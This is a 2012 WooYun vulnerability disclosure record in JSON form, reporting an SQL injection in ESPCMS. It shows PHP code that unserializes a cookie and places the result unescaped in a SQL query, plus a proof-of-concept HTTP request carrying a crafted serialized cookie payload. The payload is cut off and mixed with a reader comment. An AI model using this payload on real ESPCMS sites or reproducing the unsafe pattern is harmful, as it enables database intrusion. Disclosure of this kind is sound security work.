{"id": 18094, "wybug_id": "wooyun-2012-09471", "wybug_title": "ESPCMS　SQL注入漏洞", "wybug_corp": "ESPCMS", "wybug_author": "Zvall", "wybug_date": "2012-07-11 11:31", "wybug_open_date": "2012-08-25 11:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-08-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： SQL注入  详细说明：  \n$membercookieview = $this->member_cookieview();\t\t\tif (!empty($membercookieview['userid']) && !empty($membercookieview['username'])) {\t\t\t\t$rsMember = $this->get_member(null, $membercookieview['userid']);\t\t\t}\t\t\t$this->pagetemplate->assign('member', $rsMember);\t\t}\t\t$cartid = $this->fun->accept('ecisp_enquiry_list', 'C');\t\t$cartid = stripslashes(htmlspecialchars_decode($cartid));\t\t$uncartid = !empty($cartid) ? unserialize($cartid) : 0;\t\tif ($uncartid && is_array($uncartid)) {\t\t\t$didarray = $this->fun->key_array_name($uncartid, 'did', 'amount');\t\t\t$didlist = $this->fun->format_array_text(array_keys($didarray), ',');\t\t\tif (!empty($didlist)) {\t\t\t\t$db_table = db_prefix . 'document';\t\t\t\t$db_where = \"isclass=1 AND did in($didlist) ORDER BY did DESC\";\t\t\t\techo $sql = \"SELECT * FROM $db_table WHERE $db_where\";\t\t\t\t$rs = $this->db->query($sql);\t\t\t\t$productmoney = 0;\t\t\t\twhile ($rsList = $this->db->fetch_assoc($rs)) {\t\t\t\t\t$rsList['link'] = $this->get_link('doc', $rsList, admin_LNG);\t\t\t\t\t$rsList['buylink'] = $this->get_link('buylink', $rsList, admin_LNG);\t\t\t\t\t$rsList['enqlink'] = $this->get_link('enqlink', $rsList, admin_LNG);\t\t\t\t\t$rsList['dellink'] = $this->get_link('enqdel', $rsList, admin_LNG);\t\t\t\t\t$rsList['ctitle'] = empty($rsList['color']) ? $rsList['title'] : \"<font color='\" . $rsList['color'] . \"'>\" . $rsList['title'] . \"</font>\";\t\t\t\t\t$rsList['amount'] = $didarray[$rsList['did']];\t\t\t\t\t$array[] = $rsList;\n   漏洞证明：  Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-aliveReferer: http://localhost/ESP/index.php?ac=enquiry&at=into&did=27Cookie: ecisp_home_seccode=XXWCeH9lPaRlZmVZcamUmYs; ecisp_member_username=o6DFzQ; ecisp_member_info=arPekrVo4p6hxZ91qqKQx6fRr5SWl2WZkWhslJfgZWloZ5mSb2uZY7SbZmeaZZKUaMlqw53JZ5SRl5zFyJVmnm5pmJJumZ-Smt6YZ22Sl5ttnJfEnJ1nkppinMfKm2hva5mVx3GZyJGdlw; ecisp_enquiry_list=a%3A1%3A%7Bs%3A3%3A%22k27%22%3Ba%3A2%3A%7Bs%3A3%3A%22did%22%3Bs%3A8%3A%22%27 官方太不给力了！！加Q 三次。不给通过。加了Q 给他提问题 不理人！！愤怒呀\n\n   修复方案：  你懂！   版权声明：转载请注明来源 Zvall@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2012-07-11 22:28 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  intal    \n     2013-03-07 18:23 |    \t\tSeay \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:8        )\t\t \n  官方太不给力了！！加Q 三次。不给通过。加了Q 给他提问题 不理人！！愤怒呀我还是直接放出来吧。。。    \n     2013-03-07 19:22 |    \t\tPhp0day \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | php安全开发、代码审计、渗透测试。)\t\t \n  前排支持......    \n     2013-03-08 10:20 |    \t\tP w \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:14        | -这家伙很懒,什么都没有留下。其实我真的很...)\t\t \n  支持+1! 哈哈    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}